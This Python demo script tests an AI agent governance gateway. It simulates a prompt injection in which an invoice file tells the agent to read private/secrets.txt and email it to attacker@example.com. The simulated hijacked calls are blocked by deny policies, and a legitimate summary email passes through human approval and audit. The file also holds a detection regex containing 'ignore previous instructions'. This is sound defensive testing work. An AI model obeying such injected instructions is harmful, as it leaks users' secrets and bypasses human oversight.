"""End-to-end Phase 2 prompt-injection & human-approval demonstration.

Demonstrates:
1. Agent reads permitted documents/invoice.txt via Chaperone MCP gateway.
2. Document contains injected instructions to read private/secrets.txt and exfiltrate to
   attacker@example.com.
3. Simulated hijacked agent attempts both unauthorized calls through Chaperone; deterministic
   policies block both before any adapter executes.
4. Agent submits a legitimate internal summary email (finance@company.com) which enters the
   human approval workflow (PENDING), executes only after administrator approval, and is
   independently verified against mock provider DB state.
5. Chronological audit trail records every request, decision, block, approval, execution, and
   verification without exposing secrets.
"""

from __future__ import annotations

import asyncio
import json
import re
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any
from uuid import UUID

from pydantic import SecretStr
from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession, async_sessionmaker

from app.adapters.file_adapter import ensure_demo_sandbox
from app.adapters.mcp.client import connect_in_memory_mcp
from app.adapters.mcp.server import create_chaperone_mcp_server
from app.approvals.service import ApprovalService
from app.core.config import Settings
from app.core.database import Base, build_engine, build_session_factory
from app.models.enums import PolicyDecision, RiskLevel
from app.schemas.agent import AgentCreateRequest
from app.schemas.policy import PolicyCreateRequest
from app.schemas.tool import ToolCreateRequest
from app.services.agent_service import AgentService
from app.services.audit_service import AuditService
from app.services.policy_service import PolicyService
from app.services.tool_service import ToolService

_INJECTION_SIGNAL_RE = re.compile(
    r"(?i)(ignore\s+previous\s+instructions|private/secrets\.txt|exfiltrat)"
)


@dataclass(frozen=True, slots=True)
class PromptInjectionDemoReport:
    """Structured output of the Phase 2 prompt-injection & governance demonstration."""

    invoice_summary: str
    prompt_injection_signal_detected: bool
    permitted_read_outcome: dict[str, Any]
    blocked_private_read_outcome: dict[str, Any]
    blocked_exfil_email_outcome: dict[str, Any]
    approval_requested_outcome: dict[str, Any]
    approved_execution_status: str
    approved_verification_status: str
    audit_event_count: int
    audit_timeline: list[dict[str, Any]]
    secrets_leaked: bool


def _extract_safe_invoice_summary(content: str) -> tuple[str, bool]:
    """Extract only safe invoice lines while treating the document as untrusted data."""
    signal_detected = bool(_INJECTION_SIGNAL_RE.search(content))
    invoice_num = "UNKNOWN"
    amount = "UNKNOWN"
    for line in content.splitlines():
        if line.lower().startswith("invoice number:"):
            invoice_num = line.split(":", 1)[1].strip().rstrip(".")
        elif line.lower().startswith("amount:"):
            amount = line.split(":", 1)[1].strip().rstrip(".")
    return f"Invoice {invoice_num} total amount is {amount}.", signal_detected


async def _seed_demo_environment(
    session: AsyncSession,
    *,
    settings: Settings,
) -> tuple[UUID, str]:
    agent_svc = AgentService()
    tool_svc = ToolService()
    policy_svc = PolicyService()

    agent, raw_key = await agent_svc.register_agent(
        session,
        AgentCreateRequest(
            name="invoice-summary-agent",
            description="Reads permitted invoices and submits internal summaries.",
        ),
        settings=settings,
    )

    for tool_req in (
        ToolCreateRequest(
            name="file_tool",
            description="Sandboxed file tool (read, write, list)",
            category="filesystem",
            risk_level=RiskLevel.MEDIUM,
        ),
        ToolCreateRequest(
            name="email_tool",
            description="Mock email provider (create_draft, send, read)",
            category="communication",
            risk_level=RiskLevel.HIGH,
        ),
        ToolCreateRequest(
            name="database_tool",
            description="Structured demo table tool (read, create, update)",
            category="database",
            risk_level=RiskLevel.MEDIUM,
        ),
    ):
        await tool_svc.register_tool(session, tool_req)

    policies = [
        PolicyCreateRequest(
            name="demo-allow-read-documents",
            agent_id=agent.id,
            tool_name="file_tool",
            action="read",
            resource_scope="documents/*",
            decision=PolicyDecision.ALLOW,
            priority=100,
        ),
        PolicyCreateRequest(
            name="demo-deny-private-files",
            agent_id=None,
            tool_name="file_tool",
            action="*",
            resource_scope="private/*",
            decision=PolicyDecision.DENY,
            priority=500,
        ),
        PolicyCreateRequest(
            name="demo-require-approval-company-email",
            agent_id=agent.id,
            tool_name="email_tool",
            action="send",
            resource_scope="*@company.com",
            decision=PolicyDecision.REQUIRE_APPROVAL,
            priority=100,
        ),
        PolicyCreateRequest(
            name="demo-deny-external-attacker-email",
            agent_id=None,
            tool_name="email_tool",
            action="*",
            resource_scope="attacker@example.com",
            decision=PolicyDecision.DENY,
            priority=500,
        ),
    ]
    for policy_req in policies:
        await policy_svc.create_policy(session, policy_req)

    return agent.id, raw_key


async def run_prompt_injection_demo(
    *,
    session_factory: async_sessionmaker[AsyncSession],
    settings: Settings,
) -> PromptInjectionDemoReport:
    """Execute the full Phase 2 prompt-injection & human-approval scenario over MCP."""
    ensure_demo_sandbox(Path(settings.sandbox_dir))
    async with session_factory() as session:
        agent_id, agent_key = await _seed_demo_environment(session, settings=settings)

    mcp_server = create_chaperone_mcp_server(
        session_factory=session_factory,
        settings=settings,
        bound_agent_key=agent_key,
    )
    approval_svc = ApprovalService()
    audit_svc = AuditService()

    async with connect_in_memory_mcp(mcp_server) as mcp_client:
        # 1. Legitimate read of documents/invoice.txt
        read_res = await mcp_client.call_tool(
            tool_name="file_tool",
            action="read",
            resource="documents/invoice.txt",
            arguments={"path": "documents/invoice.txt"},
            correlation_id="demo-read-invoice-001",
        )
        raw_content = read_res.payload.get("output", {}).get("content", "")
        summary, signal_detected = _extract_safe_invoice_summary(raw_content)

        # 2. Simulated hijacked attempts following injected instructions (MUST be blocked)
        blocked_private = await mcp_client.call_tool(
            tool_name="file_tool",
            action="read",
            resource="private/secrets.txt",
            arguments={"path": "private/secrets.txt"},
            correlation_id="demo-inject-private-002",
        )
        blocked_exfil = await mcp_client.call_tool(
            tool_name="email_tool",
            action="send",
            resource="attacker@example.com",
            arguments={
                "to": "attacker@example.com",
                "subject": "Exfiltrated Secrets",
                "body": "Attempted exfiltration payload",
            },
            correlation_id="demo-inject-exfil-003",
        )

        # 3. Legitimate summary email requires human approval
        approval_req_res = await mcp_client.call_tool(
            tool_name="email_tool",
            action="send",
            resource="finance@company.com",
            arguments={
                "to": "finance@company.com",
                "subject": "Summary for INV-2026-001",
                "body": summary,
            },
            correlation_id="demo-finance-email-004",
        )

    approval_id = UUID(str(approval_req_res.payload["approval_id"]))

    # 4. Human administrator approves -> Chaperone executes & independently verifies
    async with session_factory() as session:
        approved_model, verification, _ = await approval_svc.approve(
            session,
            approval_id=approval_id,
            reviewer_id="security-lead-demo",
            comment="Verified legitimate finance summary with zero private data.",
            execute_now=True,
            settings=settings,
        )

        events, total_events = await audit_svc.list_events(
            session,
            page=1,
            page_size=100,
            agent_id=agent_id,
            order="asc",
        )

    timeline = [
        {
            "event_type": ev.event_type,
            "correlation_id": ev.correlation_id,
            "tool_name": ev.tool_name,
            "action": ev.action,
            "resource": ev.resource,
            "decision": ev.decision,
            "execution_status": ev.execution_status,
            "verification_status": ev.verification_status,
            "reviewer_id": ev.reviewer_id,
        }
        for ev in events
    ]
    serialized_summary_and_audit = json.dumps({"summary": summary, "timeline": timeline})
    secrets_leaked = "demo-secret-token" in serialized_summary_and_audit

    return PromptInjectionDemoReport(
        invoice_summary=summary,
        prompt_injection_signal_detected=signal_detected,
        permitted_read_outcome=read_res.payload,
        blocked_private_read_outcome=blocked_private.payload,
        blocked_exfil_email_outcome=blocked_exfil.payload,
        approval_requested_outcome=approval_req_res.payload,
        approved_execution_status=approved_model.status,
        approved_verification_status=verification.status.value if verification else "none",
        audit_event_count=total_events,
        audit_timeline=timeline,
        secrets_leaked=secrets_leaked,
    )


async def _run_cli_demo() -> None:
    with tempfile.TemporaryDirectory(prefix="chaperone_demo_") as tmp_dir:
        tmp_path = Path(tmp_dir)
        db_file = tmp_path / "demo.db"
        sandbox_dir = tmp_path / "sandbox"
        settings = Settings(
            env="test",
            log_json=False,
            database_url=f"sqlite+aiosqlite:///{db_file.as_posix()}",
            admin_api_key=SecretStr("axly_adm_demo_bootstrap_key_0123456789abcdef"),
            api_key_hash_iterations=10_000,
            rate_limit_enabled=False,
            sandbox_dir=str(sandbox_dir),
        )
        engine: AsyncEngine = build_engine(settings.database_url)
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)

        try:
            factory = build_session_factory(engine)
            report = await run_prompt_injection_demo(session_factory=factory, settings=settings)
            output = {
                "invoice_summary": report.invoice_summary,
                "prompt_injection_signal_detected": report.prompt_injection_signal_detected,
                "permitted_read_status": report.permitted_read_outcome.get("status"),
                "blocked_private_read_status": report.blocked_private_read_outcome.get("status"),
                "blocked_exfil_email_status": report.blocked_exfil_email_outcome.get("status"),
                "approval_requested_status": report.approval_requested_outcome.get("status"),
                "approved_execution_status": report.approved_execution_status,
                "approved_verification_status": report.approved_verification_status,
                "audit_event_count": report.audit_event_count,
                "secrets_leaked": report.secrets_leaked,
            }
            print(json.dumps(output, indent=2))
        finally:
            await engine.dispose()


if __name__ == "__main__":
    asyncio.run(_run_cli_demo())
